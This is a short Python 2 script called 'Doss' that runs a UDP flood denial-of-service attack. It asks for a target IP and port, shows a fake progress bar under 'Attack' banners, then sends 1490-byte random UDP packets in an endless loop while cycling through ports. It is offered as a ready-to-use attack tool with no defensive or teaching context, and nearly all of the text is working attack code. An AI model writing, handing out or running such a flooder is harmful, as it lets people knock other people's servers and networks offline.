# Doss
#https://mehdieditor.websites.co.in

 import sys 

 import os 

 import time 

 import socket 

 import random 

 #Code Time 

 from datetime import datetime 

 now = datetime.now() 

 hour = now.hour 

 minute = now.minute 

 day = now.day 

 month = now.month 

 year = now.year 

  

 ############## 

 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

 bytes = random._urandom(1490) 

 ############# 

 os.system("clear") 

 print ('\033[1;31m') 

 os.system("figlet D a r k") 

 print ('\033[1;32m') 

 print "insta    : https://instagram.com " 

 print "github   : https://github.com/CreackDark" 

 print "telegram : https://t.me/telegram " 

 print 

 print "========================================" 

 print ('\033[1;33m') 

 ip = raw_input(" IP Target : ") 

 port = input(" Port Target : ") 

 os.system("clear") 

 print ('\033[1;35m') 

 os.system("figlet A t t a c k") 

 print "[                    ] 0% " 

 time.sleep(2) 

 print "[=====               ] 25%" 

 time.sleep(2) 

 print "[==========          ] 50%" 

 time.sleep(2) 

 print "[===============     ] 75%" 

 time.sleep(2) 

 print "[====================] 100%" 

 time.sleep(1) 

 sent = 0 

 while True: 

      sock.sendto(bytes, (ip,port)) 

      sent = sent + 1 

      port = port + 1 

      print "Sent %s packet to %s throught port:%s"%(sent,ip,port) 

      if port == 65534: 

        port = 1
